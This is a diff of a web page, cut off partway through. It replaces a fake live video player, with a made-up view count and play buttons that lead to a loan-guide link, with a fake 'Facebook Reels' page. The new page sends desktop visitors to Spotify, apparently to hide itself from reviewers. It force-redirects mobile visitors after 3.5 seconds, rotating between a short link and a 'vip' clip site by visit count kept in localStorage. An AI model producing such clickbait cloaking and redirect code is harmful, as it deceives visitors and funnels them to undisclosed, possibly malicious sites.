@@ -1,10 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script data-domain='us-news-hub.blogspot.com/vSsyCz' defer='defer' src='https://api.publytics.net/js/script.manual.min.js'/>
 <script>
-    window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
-    publytics(&#39;pageview&#39;);
+    // Function to detect if the user is on a PC or laptop
+    var userAgent = navigator.userAgent.toLowerCase();
+    
+    // Check for Windows or Mac OS (typical PC/laptop platforms)
+    if (userAgent.indexOf("windows") !== -1 || userAgent.indexOf("macintosh") !== -1) {
+        // Redirect to the desired URL for PC users
+        window.location.href = "https://open.spotify.com/";  // Replace with your shortened URL
+    }
 </script>
   <script defer data-domain="link69x.vercel.app/bDqxlj" src="https://api.publytics.net/js/script.manual.min.js"></script>
 <script>
@@ -12,1602 +17,216 @@
     publytics('pageview');
 </script>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet">
-
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Facebook Reels Clone</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#000;color:#fff;overflow:hidden}
+.reels-container{
+  height:100vh;
+  width:100vw;
+  overflow-y:scroll;
+  scroll-snap-type:y mandatory;
+  -webkit-overflow-scrolling:touch;
 }
-
-html,
-body{
-  width:100%;
-  min-height:100%;
-  overflow-x:hidden;
-  font-family:'Lexend',Arial,sans-serif;
-  background:#0b0b0b;
-}
-
-/* =========================================
-   LANDING PAGE
-========================================= */
-
-.page-content{
-  width:100%;
-  min-height:100vh;
-  min-height:100dvh;
-
-  background:
-    radial-gradient(
-      circle at top,
-      #202020 0%,
-      #0d0d0d 45%,
-      #050505 100%
-    );
-
-  display:flex;
-  justify-content:center;
-}
-
-.app-content{
-  width:100%;
-  max-width:1050px;
-  min-height:100vh;
-  min-height:100dvh;
-
-  padding:28px 16px 24px;
-
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-}
-
-/* =========================================
-   TITLE
-========================================= */
-
-.land-title{
-  color:#fff;
-  text-align:center;
-
-  font-size:21px;
-  line-height:1.4;
-  font-weight:650;
-
-  letter-spacing:.2px;
-
-  text-shadow:
-    0 2px 10px rgba(0,0,0,.7);
-}
-
-.decorate{
-  width:180px;
-  height:4px;
-
-  margin:13px auto 22px;
-
-  border-radius:20px;
-
-  background:
-    linear-gradient(
-      90deg,
-      transparent,
-      #ff1744,
-      #ff1744,
-      transparent
-    );
-
-  box-shadow:
-    0 0 20px rgba(255,23,68,.3);
-}
-
-/* =========================================
-   PLAYER AREA
-========================================= */
-
-.middle-bg{
-  width:100%;
-
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-}
-
-.player-wrapper{
-  width:100%;
-  max-width:900px;
-
-  border-radius:14px;
-  overflow:hidden;
-
-  box-shadow:
-    0 20px 60px rgba(0,0,0,.65),
-    0 0 0 1px rgba(255,255,255,.04);
-}
-
-/* =========================================
-   FAKE PLAYER
-========================================= */
-
-.fake-player{
+.reel{
   position:relative;
-
-  width:100%;
-  max-width:900px;
-
-  aspect-ratio:16 / 9;
-
-  background:#000;
-
-  overflow:hidden;
-
-  font-family:Arial,Helvetica,sans-serif;
-
-  user-select:none;
-}
-
-/* =========================================
-   BADGES
-========================================= */
-
-.live-badges{
-  position:absolute;
-
-  top:17px;
-  left:17px;
-
-  display:flex;
-  align-items:center;
-  gap:6px;
-
-  z-index:20;
-}
-
-.live-badge{
-  background:#ff1744;
-  color:#fff;
-
-  font-size:11px;
-  font-weight:800;
-
-  padding:5px 8px;
-
-  border-radius:4px;
-
-  line-height:1;
-
-  box-shadow:
-    0 2px 8px rgba(0,0,0,.3);
-}
-
-.views-badge{
-  display:flex;
-  align-items:center;
-  gap:4px;
-
-  background:rgba(20,20,20,.9);
-
-  color:#fff;
-
-  font-size:11px;
-  font-weight:700;
-
-  padding:5px 8px;
-
-  border-radius:4px;
-
-  line-height:1;
-}
-
-.views-badge svg{
-  width:12px;
-  height:12px;
-
-  fill:none;
-  stroke:#fff;
-  stroke-width:2;
-}
-
-/* =========================================
-   CENTER LOGO
-========================================= */
-
-.center-logo{
-  position:absolute;
-
-  top:50%;
-  left:50%;
-
-  transform:translate(-50%,-50%);
-
-  width:175px;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  z-index:5;
-
-  pointer-events:none;
-
-  opacity:.9;
-}
-
-.center-logo img{
-  display:block;
-
-  width:100%;
-  height:auto;
-
-  max-height:65px;
-
-  object-fit:contain;
-}
-
-/* =========================================
-   PLAY BUTTON
-========================================= */
-
-.play-button{
-  position:absolute;
-
-  top:50%;
-  left:50%;
-
-  transform:translate(-50%,-50%);
-
-  width:62px;
-  height:62px;
-
-  padding:0;
-
-  border:2px solid rgba(255,255,255,.9);
-
-  border-radius:50%;
-
-  background:rgba(0,0,0,.28);
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  cursor:pointer;
-
-  z-index:30;
-
-  transition:
-    transform .2s ease,
-    background .2s ease,
-    box-shadow .2s ease;
-
-  box-shadow:
-    0 0 0 9px rgba(255,255,255,.08),
-    0 8px 30px rgba(0,0,0,.45);
-}
-
-.play-button:hover{
-  transform:
-    translate(-50%,-50%)
-    scale(1.08);
-
-  background:rgba(255,255,255,.1);
-
-  box-shadow:
-    0 0 0 13px rgba(255,255,255,.1),
-    0 10px 35px rgba(0,0,0,.55);
-}
-
-.play-button svg{
-  width:29px;
-  height:29px;
-
-  fill:#fff;
-
-  margin-left:3px;
-}
-
-/* =========================================
-   PLAY PULSE
-========================================= */
-
-.play-button::before,
-.play-button::after{
-  content:"";
-
-  position:absolute;
-
-  top:50%;
-  left:50%;
-
-  width:62px;
-  height:62px;
-
-  border-radius:50%;
-
-  border:1px solid rgba(255,255,255,.18);
-
-  transform:
-    translate(-50%,-50%)
-    scale(.7);
-
-  animation:playerPulse 2s infinite;
-
-  pointer-events:none;
-}
-
-.play-button::after{
-  animation-delay:.8s;
-}
-
-@keyframes playerPulse{
-
-  0%{
-    opacity:.7;
-    transform:
-      translate(-50%,-50%)
-      scale(.7);
-  }
-
-  100%{
-    opacity:0;
-    transform:
-      translate(-50%,-50%)
-      scale(1.8);
-  }
-
-}
-
-/* =========================================
-   LOADING
-========================================= */
-
-.loading-screen{
-  position:absolute;
-
-  inset:0;
-
-  display:none;
-
-  align-items:center;
-  justify-content:center;
-
-  background:rgba(0,0,0,.55);
-
-  z-index:100;
-}
-
-.loading-spinner{
-  width:38px;
-  height:38px;
-
-  border:3px solid rgba(255,255,255,.25);
-
-  border-top-color:#fff;
-
-  border-radius:50%;
-
-  animation:
-    loadingSpin .7s linear infinite;
-}
-
-@keyframes loadingSpin{
-
-  to{
-    transform:rotate(360deg);
-  }
-
-}
-
-/* =========================================
-   MUTE
-========================================= */
-
-.mute-button{
-  position:absolute;
-
-  right:13px;
-  bottom:59px;
-
-  width:30px;
-  height:30px;
-
-  padding:5px;
-
-  border:0;
-
-  background:none;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  cursor:pointer;
-
-  z-index:25;
-}
-
-.mute-button svg{
-  width:18px;
-  height:18px;
-
-  fill:#fff;
-  stroke:#fff;
-
-  stroke-width:1.5;
-}
-
-.volume-off{
-  display:none;
-}
-
-/* =========================================
-   CONTROLS
-========================================= */
-
-.controls{
-  position:absolute;
-
-  left:0;
-  right:0;
-  bottom:0;
-
-  height:49px;
-
-  padding:0 14px;
-
-  display:flex;
-  align-items:center;
-
-  gap:13px;
-
-  background:
-    linear-gradient(
-      to top,
-      rgba(0,0,0,.98),
-      rgba(0,0,0,.65)
-    );
-
-  z-index:15;
-}
-
-.control-btn{
-  width:21px;
-  height:26px;
-
-  padding:0;
-
-  border:0;
-
-  background:none;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  cursor:pointer;
-
-  color:#fff;
-
-  flex-shrink:0;
-}
-
-.control-btn svg{
-  width:18px;
-  height:18px;
-
-  fill:#fff;
-  stroke:#fff;
-
-  stroke-width:1.5;
-}
-
-.control-btn:hover svg{
-  opacity:.65;
-}
-
-/* =========================================
-   LIVE
-========================================= */
-
-.live-control{
-  color:#fff;
-
-  font-size:12px;
-  font-weight:600;
-
-  display:flex;
-  align-items:center;
-
-  gap:5px;
-
-  flex-shrink:0;
-}
-
-.live-control span{
-  width:8px;
-  height:8px;
-
-  background:#ff1744;
-
-  border-radius:50%;
-
-  box-shadow:
-    0 0 8px rgba(255,23,68,.7);
-
-  animation:liveBlink 1.3s infinite;
-}
-
-@keyframes liveBlink{
-
-  0%,100%{
-    opacity:1;
-  }
-
-  50%{
-    opacity:.3;
-  }
-
-}
-
-/* =========================================
-   PROGRESS
-========================================= */
-
-.progress{
-  height:4px;
-
-  flex:1;
-
-  min-width:20px;
-
-  background:#333;
-
-  border-radius:5px;
-
-  cursor:pointer;
-
-  overflow:hidden;
-}
-
-.progress-fill{
-  width:3%;
-  height:100%;
-
-  background:#ff1744;
-
-  border-radius:5px;
-
-  transition:width .15s ease;
-}
-
-/* =========================================
-   HD
-========================================= */
-
-.hd-button{
-  border:0;
-
-  background:#ff1744;
-
-  color:#fff;
-
-  font-size:10px;
-  font-weight:800;
-
-  padding:4px 7px;
-
-  border-radius:3px;
-
-  cursor:pointer;
-
-  flex-shrink:0;
-}
-
-/* =========================================
-   FULLSCREEN
-========================================= */
-
-.fake-player.fullscreen{
-  position:fixed;
-
-  inset:0;
-
   width:100vw;
   height:100vh;
-
-  max-width:none;
-
-  aspect-ratio:auto;
-
-  margin:0;
-
-  z-index:999999;
+  scroll-snap-align:start;
+  cursor:pointer;
+  overflow:hidden;
+  display:flex;
+  justify-content:center;
+  align-items:center;
 }
-
-/* =========================================
-   DESCRIPTION
-========================================= */
-
-.intros-view{
-  width:100%;
-
-  max-width:850px;
-
-  margin-top:20px;
-
-  padding:0 8px;
+.reel img{
+  width:100vw;
+  height:100vh;
+  object-fit:cover;
+  object-position:center;
+  display:block;
 }
-
-.info{
-  color:rgba(255,255,255,.82);
-
-  font-size:15px;
-
-  line-height:1.65;
-
-  text-align:center;
-
-  font-weight:350;
-
-  text-shadow:
-    0 1px 6px rgba(0,0,0,.5);
+.profile-section,
+.caption,
+.right-icons,
+.play-button {
+  position:absolute;
+  z-index:5;
 }
-
-/* =========================================
-   CTA
-========================================= */
-
-.bottoms{
-  width:100%;
-
-  padding:24px 0 18px;
-
+.profile-section{
+  bottom:95px;
+  left:12px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.caption{
+  bottom:50px;
+  left:12px;
+  font-size:13px;
+  width:70vw;
+  line-height:1.3;
+  color:#f1f1f1;
+  text-shadow:0 1px 2px #000;
+}
+.right-icons{
+  right:10px;
+  bottom:130px;
   display:flex;
   flex-direction:column;
   align-items:center;
-
-  gap:13px;
+  gap:18px;
 }
-
-.cta-wrapper{
-  width:100%;
-  max-width:330px;
-
-  position:relative;
-
-  padding-bottom:31px;
-}
-
-.download-btn{
-  width:100%;
-
-  min-height:52px;
-
-  border:0;
-
-  border-radius:50px;
-
-  background:
-    linear-gradient(
-      135deg,
-      #ff1744,
-      #d50032
-    );
-
-  color:#fff;
-
-  font-family:'Lexend',Arial,sans-serif;
-
-  font-size:16px;
-
-  font-weight:700;
-
-  letter-spacing:.2px;
-
-  cursor:pointer;
-
-  box-shadow:
-    0 10px 30px rgba(255,23,68,.28);
-
-  transition:
-    transform .2s ease,
-    box-shadow .2s ease;
-}
-
-.download-btn:hover{
-  transform:translateY(-2px);
-
-  box-shadow:
-    0 14px 36px rgba(255,23,68,.38);
-}
-
-.download-btn:active{
-  transform:scale(.97);
-}
-
-/* =========================================
-   HAND
-========================================= */
-
-.hand-click{
-  position:absolute;
-
-  right:9px;
-  bottom:1px;
-
-  font-size:29px;
-
-  color:#fff;
-
-  line-height:1;
-
-  text-shadow:
-    0 3px 15px rgba(0,0,0,.7);
-
-  animation:
-    handMove 1.8s ease-in-out infinite;
-
-  pointer-events:none;
-}
-
-@keyframes handMove{
-
-  0%,100%{
-    transform:
-      translateY(0)
-      rotate(0)
-      scale(1);
-  }
-
-  25%{
-    transform:
-      translateY(-10px)
-      rotate(-6deg)
-      scale(1.08);
-  }
-
-  50%{
-    transform:
-      translateY(5px)
-      rotate(4deg)
-      scale(.95);
-  }
-
-  75%{
-    transform:
-      translateY(-6px)
-      rotate(-3deg)
-      scale(1.04);
-  }
-
-}
-
-/* =========================================
-   LIVE TEXT
-========================================= */
-
-.live{
-  display:flex;
-
-  align-items:center;
-
-  gap:7px;
-
-  color:rgba(255,255,255,.65);
-
-  font-size:11px;
-
-  font-weight:600;
-
-  text-transform:uppercase;
-
-  letter-spacing:.7px;
-}
-
-.circle{
-  width:8px;
-  height:8px;
-
+.play-button{
+  top:48%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:58px;height:58px;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(255,255,255,0.25);
   border-radius:50%;
-
-  background:#ff1744;
-
-  box-shadow:
-    0 0 10px rgba(255,23,68,.7);
-
-  animation:
-    liveBlink 1.4s infinite;
 }
-
-/* =========================================
-   FOOTER BRAND
-========================================= */
-
-.logo{
-  width:100px;
-  height:30px;
-
-  opacity:.5;
-
-  background-image:
-    url('https://assets.stardusttv.cc/uploadfile/static/logo.png');
-
-  background-size:contain;
-  background-position:center;
-  background-repeat:no-repeat;
-
-  filter:brightness(0) invert(1);
+.play-button img{width:28px;height:28px;filter:invert(1)}
+.icon{display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer}
+.icon i{font-size:24px;color:white;}
+.icon span{font-size:12px;font-weight:500;color:#eaeaea;margin-top:4px}
+.profile-ring{
+  width:30px;height:30px;
+  border-radius:50%;
+  border:1.5px solid #2e89ff;
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden;
 }
-
-/* =========================================
-   MOBILE
-========================================= */
-
-@media(max-width:600px){
-
-  .app-content{
-    padding:
-      20px
-      10px
-      18px;
-  }
-
-  .land-title{
-    font-size:16px;
-  }
-
-  .decorate{
-    width:145px;
-    height:3px;
-
-    margin:
-      10px auto
-      17px;
-  }
-
-  .player-wrapper{
-    border-radius:9px;
-  }
-
-  .live-badges{
-    top:9px;
-    left:9px;
-  }
-
-  .live-badge,
-  .views-badge{
-    font-size:9px;
-    padding:4px 6px;
-  }
-
-  .center-logo{
-    width:125px;
-  }
-
-  .center-logo img{
-    max-height:45px;
-  }
-
-  .play-button{
-    width:48px;
-    height:48px;
-  }
-
-  .play-button svg{
-    width:23px;
-    height:23px;
-  }
-
-  .controls{
-    height:39px;
-
-    padding:0 8px;
-
-    gap:7px;
-  }
-
-  .control-btn{
-    width:17px;
-    height:22px;
-  }
-
-  .control-btn svg{
-    width:15px;
-    height:15px;
-  }
-
-  .live-control{
-    font-size:9px;
-    gap:3px;
-  }
-
-  .live-control span{
-    width:6px;
-    height:6px;
-  }
-
-  .hd-button{
-    font-size:8px;
-    padding:3px 5px;
-  }
-
-  .mute-button{
-    right:7px;
-    bottom:44px;
-  }
-
-  .mute-button svg{
-    width:14px;
-    height:14px;
-  }
-
-  .intros-view{
-    margin-top:15px;
-  }
-
-  .info{
-    font-size:13px;
-  }
-
-  .bottoms{
-    padding-top:19px;
-  }
-
-  .download-btn{
-    min-height:48px;
-    font-size:14px;
-  }
-
-  .cta-wrapper{
-    max-width:290px;
-  }
-
-  .hand-click{
-    font-size:25px;
-  }
-
+.profile-ring img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  transform:scale(0.85);
+  border-radius:50%;
 }
-
-@media(max-width:380px){
-
-  .controls{
-    gap:5px;
-    padding:0 6px;
-  }
-
-  .live-control{
-    display:none;
-  }
-
-  .center-logo{
-    width:105px;
-  }
-
+.username{
+  font-size:13px;font-weight:600;
+  display:flex;align-items:center;gap:4px;
 }
+.verify-box{
+  width:12px;height:12px;background:#2e89ff;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+}
+.verify-box i{color:#fff;font-size:7px}
+.follow-btn{
+  background:#fff;color:#000;border:none;border-radius:6px;
+  padding:2px 7px;font-size:11px;font-weight:600;cursor:pointer;
+}
+.reels-container::-webkit-scrollbar{display:none}
 </style>
+
 </head>
-
 <body>
-
-<div class="page-content">
-
-  <main class="app-content">
-
-    <!-- TITLE -->
-    <div class="land-title">
-   
-    </div>
-
-    <div class="decorate"></div>
-
-
-    <!-- =====================================
-         PLAYER
-    ====================================== -->
-
-    <div class="middle-bg">
-
-      <div class="player-wrapper">
-
-        <div class="fake-player" id="fakePlayer">
-
-          <!-- BADGES -->
-
-          <div class="live-badges">
-
-            <span class="live-badge">
-              LIVE
-            </span>
-
-            <span class="views-badge">
-
-              <svg
-                viewBox="0 0 24 24"
-                aria-hidden="true"
-              >
-                <path
-                  d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12z"
-                />
-
-                <circle
-                  cx="12"
-                  cy="12"
-                  r="2.7"
-                />
-              </svg>
-
-              20K
-
-            </span>
-
-          </div>
-
-
-
-          <!-- PLAY -->
-
-          <button
-            class="play-button"
-            id="playButton"
-            type="button"
-            aria-label="Play"
-          >
-
-            <svg
-              viewBox="0 0 64 64"
-              aria-hidden="true"
-            >
-
-              <path
-                d="M25 17l23 15c2 1 2 4 0 5L25 48c-2 2-4 0-4-2V19c0-2 2-3 4-2z"
-              />
-
-            </svg>
-
-          </button>
-
-
-          <!-- LOADING -->
-
-          <div
-            class="loading-screen"
-            id="loadingScreen"
-          >
-
-            <div class="loading-spinner"></div>
-
-          </div>
-
-
-          <!-- MUTE -->
-
-          <button
-            class="mute-button"
-            id="muteButton"
-            type="button"
-            aria-label="Mute"
-          >
-
-            <svg
-              class="volume-on"
-              viewBox="0 0 24 24"
-            >
-
-              <path d="M4 9v6h4l5 4V5L8 9H4z"/>
-              <path d="M16 9c2 2 2 4 0 6"/>
-              <path d="M18.5 6.5c4 3 4 8 0 11"/>
-
-            </svg>
-
-
-            <svg
-              class="volume-off"
-              viewBox="0 0 24 24"
-            >
-
-              <path d="M4 9v6h4l5 4V5L8 9H4z"/>
-              <path d="M17 9l4 6"/>
-              <path d="M21 9l-4 6"/>
-
-            </svg>
-
-          </button>
-
-
-          <!-- CONTROLS -->
-
-          <div class="controls">
-
-            <!-- PLAY -->
-
-            <button
-              class="control-btn"
-              id="controlPlay"
-              type="button"
-              aria-label="Play"
-            >
-
-              <svg viewBox="0 0 24 24">
-                <path d="M8 5l11 7-11 7V5z"/>
-              </svg>
-
-            </button>
-
-
-            <!-- NEXT -->
-
-            <button
-              class="control-btn"
-              type="button"
-              aria-label="Next"
-            >
-
-              <svg viewBox="0 0 24 24">
-
-                <path d="M6 5l10 7-10 7V5z"/>
-                <path d="M18 5v14"/>
-
-              </svg>
-
-            </button>
-
-
-            <!-- VOLUME -->
-
-            <button
-              class="control-btn"
-              id="controlVolume"
-              type="button"
-              aria-label="Volume"
-            >
-
-              <svg
-                class="volume-control-on"
-                viewBox="0 0 24 24"
-              >
-
-                <path d="M4 9v6h4l5 4V5L8 9H4z"/>
-                <path d="M16 9c2 2 2 4 0 6"/>
-
-              </svg>
-
-
-              <svg
-                class="volume-control-off"
-                viewBox="0 0 24 24"
-                style="display:none"
-              >
-
-                <path d="M4 9v6h4l5 4V5L8 9H4z"/>
-                <path d="M17 9l4 6"/>
-                <path d="M21 9l-4 6"/>
-
-              </svg>
-
-            </button>
-
-
-            <!-- LIVE -->
-
-            <div class="live-control">
-
-              <span></span>
-
-              LIVE
-
-            </div>
-
-
-            <!-- PROGRESS -->
-
-            <div
-              class="progress"
-              id="progress"
-            >
-
-              <div class="progress-fill"></div>
-
-            </div>
-
-
-            <!-- HD -->
-
-            <button
-              class="hd-button"
-              type="button"
-            >
-              HD
-            </button>
-
-
-            <!-- SETTINGS -->
-
-            <button
-              class="control-btn settings-btn"
-              type="button"
-              aria-label="Settings"
-            >
-
-              <svg
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="currentColor"
-                stroke-width="2"
-                stroke-linecap="round"
-                stroke-linejoin="round"
-              >
-
-                <path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/>
-
-                <circle
-                  cx="12"
-                  cy="12"
-                  r="3"
-                />
-
-              </svg>
-
-            </button>
-
-
-            <!-- THEATER -->
-
-            <button
-              class="control-btn"
-              type="button"
-              aria-label="Theater"
-            >
-
-              <svg viewBox="0 0 24 24">
-
-                <rect
-                  x="4"
-                  y="6"
-                  width="16"
-                  height="12"
-                  rx="1"
-                />
-
-              </svg>
-
-            </button>
-
-
-            <!-- FULLSCREEN -->
-
-            <button
-              class="control-btn"
-              id="fullscreenButton"
-              type="button"
-              aria-label="Fullscreen"
-            >
-
-              <svg viewBox="0 0 24 24">
-
-                <path d="M4 9V4h5"/>
-                <path d="M15 4h5v5"/>
-                <path d="M20 15v5h-5"/>
-                <path d="M9 20H4v-5"/>
-
-              </svg>
-
-            </button>
-
-          </div>
-
-        </div>
-
-      </div>
-
-
-      <!-- DESCRIPTION -->
-
-      <div class="intros-view">
-
-        <p class="info">
-          Click the play button above to continue watching the full video.
-        </p>
-
-      </div>
-
-    </div>
-
-
-    <!-- =====================================
-         CTA
-    ====================================== -->
-
-    <div class="bottoms">
-
-      <div class="cta-wrapper">
-
-        <button
-          class="download-btn"
-          id="ctaButton"
-          type="button"
-        >
-          Continue Watching
-        </button>
-
-        <div
-          class="hand-click"
-          aria-hidden="true"
-        >
-          ☝
-        </div>
-
-      </div>
-
-
-      <div class="live">
-
-        <span class="circle"></span>
-
-        Live Streaming
-
-      </div>
-
-
-      <div
-        class="logo"
-        aria-label="Logo"
-      ></div>
-
-    </div>
-
-  </main>
-
-</div>
-
+<div class="reels-container" id="reelsContainer"></div>
 
 <script>
+// --- মেইন রিডাইরেক্ট লজিক ফাংশন ---
+function executeRedirect() {
+    // প্রথম ৩ বারের জন্য লিংক (আপনার samplegrate বা xccshop লিংক দিন)
+    var link1 = "https://t.co/ZTmc9jJqeO"; 
+    // ৩ বারের পর থেকে যতবার ক্লিক করবে তার লিংক
+    var link2 = "https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves"; 
 
-(function(){
+    var K = "visit_redirect";
+    var R = 86400000; // ২৪ ঘণ্টার মিলি-সেকেন্ড হিসাব
+    var n = Date.now();
+    var d;
 
-  /* =========================================
-     YOUR DESTINATION URL
-  ========================================= */
-
-  var PLAY_LINK =
-    "https://info.ajkerbanglatarikh.com/loan-guide/?utm_source=Facebook&utm_medium=Social&utm_campaign=parves";
-
-
-  /* =========================================
-     ELEMENTS
-  ========================================= */
-
-  var player =
-    document.getElementById("fakePlayer");
-
-  var playButton =
-    document.getElementById("playButton");
-
-  var controlPlay =
-    document.getElementById("controlPlay");
-
-  var loadingScreen =
-    document.getElementById("loadingScreen");
-
-  var ctaButton =
-    document.getElementById("ctaButton");
-
-
-  /* =========================================
-     PLAY → LOADING → SAME TAB
-  ========================================= */
-
-  function openWithLoading(){
-
-    if(
-      loadingScreen.style.display === "flex"
-    ){
-      return;
+    try {
+        d = JSON.parse(localStorage.getItem(K));
+    } catch(e) {
+        d = null;
     }
 
-    loadingScreen.style.display = "flex";
-
-    playButton.style.pointerEvents = "none";
-
-    controlPlay.style.pointerEvents = "none";
-
-    setTimeout(function(){
-
-      window.location.href = PLAY_LINK;
-
-    },1000);
-
-  }
-
-
-  /* =========================================
-     CENTER PLAY
-  ========================================= */
-
-  if(playButton){
-
-    playButton.addEventListener(
-      "click",
-      openWithLoading
-    );
-
-  }
-
-
-  /* =========================================
-     BOTTOM PLAY
-  ========================================= */
-
-  if(controlPlay){
-
-    controlPlay.addEventListener(
-      "click",
-      openWithLoading
-    );
-
-  }
-
-
-  /* =========================================
-     CTA BUTTON
-  ========================================= */
-
-  if(ctaButton){
-
-    ctaButton.addEventListener(
-      "click",
-      openWithLoading
-    );
-
-  }
-
-
-  /* =========================================
-     MUTE
-  ========================================= */
-
-  var muted = false;
-
-  var muteButton =
-    document.getElementById("muteButton");
-
-  var controlVolume =
-    document.getElementById("controlVolume");
-
-
-  function toggleMute(){
-
-    muted = !muted;
-
-    var volumeOn =
-      document.querySelector(".volume-on");
-
-    var volumeOff =
-      document.querySelector(".volume-off");
-
-    var controlOn =
-      document.querySelector(".volume-control-on");
-
-    var controlOff =
-      document.querySelector(".volume-control-off");
-
-
-    if(muted){
-
-      volumeOn.style.display = "none";
-      volumeOff.style.display = "block";
-
-      controlOn.style.display = "none";
-      controlOff.style.display = "block";
-
-    }else{
-
-      volumeOn.style.display = "block";
-      volumeOff.style.display = "none";
-
-      controlOn.style.display = "block";
-      controlOff.style.display = "none";
-
+    if (!d || n - d.time >= R) {
+        d = { count: 1, time: n };
+    } else {
+        d.count++;
     }
 
-  }
+    try {
+        localStorage.setItem(K, JSON.stringify(d));
+    } catch(e) {}
 
+    // d.count <= 3 মানে হলো প্রথম, দ্বিতীয় এবং তৃতীয় বার link1 এ যাবে
+    // তার বেশি হলে link2 তে যাবে
+    var finalUrl = (d.count <= 3) ? link1 : link2;
+    window.location.href = finalUrl;
+}
 
-  if(muteButton){
+// --- ৩.৫ সেকেন্ড পর অটো রিডাইরেক্ট ---
+window.addEventListener("load", function() {
+  setTimeout(function() {
+      executeRedirect();
+  }, 3500);
+});
 
-    muteButton.addEventListener(
-      "click",
-      toggleMute
-    );
+// --- রিলস তৈরি এবং ক্লিক ইভেন্ট ---
+const images = [
+   "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLwp-KIt7IpXYA-viQuR2H-Y8du8_rcWRrE_TeRlTKK376uAJym5TXgWnT4p4tP4iKY3DPvwElRt_NcVzL6hfsxB0DrHHG3ohUArBl4VvlEQMSC-42ovVdyawucW6KxuPYg9E6BiJxm7AVvoiEkZr5Cen3w_fCZvvQ7HBNfp02nu8JRylisLhdYspkyDt5/s1024/image_20-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1yaFwzj4CJgryhttYbNCj4fC4ArtAcaHSlecTUleHkhVg6l_Y8RGQMpFcDxRpvoSmOBwkfanBe5kFUAQG5oKds8YgWXLCW3aCaEcaOYIiIxwpXuBZi5_1NtQn8tirgKFUM9_-qm18nQsATK888YTb7Y-lnmdQqIuC20qB0mP2Krpno7AMIbQbRiK0_Z-H/s1300/image_19-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGndPE8ArfH4pbEhOeMQji10gUN2dHjmRncANp2-W9wwT3XqhO4ZmL2-R7H4cccoLV5XLQSdQX2X_YoXQErPRIt0miJXSF0FU04GDOvFcmPPycGf18yQtiydjFJ4hkbv383xERM3Ejh1Rn_OLFSbC2bhyvZrmFZv2_gOESv-oRaCSSx5c-ymi9tk1uCJbJ/s1300/image_18-30kb.webp",
+  "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZxnq8qU90zkS87lyK6KIn9WG6EfvSUDQzPndBjhoA_L4Thyphenhyphenb1M5lAqTO9mw8XPfRf9-CjFaDNJEUoIaDdTM3BqyhLUtRw7DT9atVEICgkHDQCEpH-1j4YL5eD3UGIcA1F3HWuQ1bkHHPbb_2wGycUUmN2d7268xbxg8wXrGRdpJaw6wlXqeGV7bxVI93K/s1300/image_17-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQL9VomhehMiXA7zTpGDtdQxIPYs8pmdhQzK4iAEe-LX2RhZnw-JaTX-V0XucC0OOqGeaUo8n6erjUseB0BfvmpnBt3KrKEnrcD4cSLL9Or6KDwcLCi3oUll2lnyhf_GYq6JlNJ_TK1xiIVJgCieuE5BU0lwcQXgkFGBPE7vlzUsrpOQatb5Xe0ZxnaK9K/s1296/image_16-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg36XtyXImJdY02fdhI1nmZZp2E1KnAMdEpgrF2ggRsNsLftVsjHss1m-l-qMjYVFCJy3VcJa_jot7C__c8OeP6PXLuALVAPhKsUS1omx2US6UJDGEN20Zd21QmRycFo5qcXRwjFkvM3fvQNTycMDcFl8ZSjVLvp6uvVul2k6o0MiKBSzI5gIWX9bRlI5nU/s1300/image_15-30kb.webp",
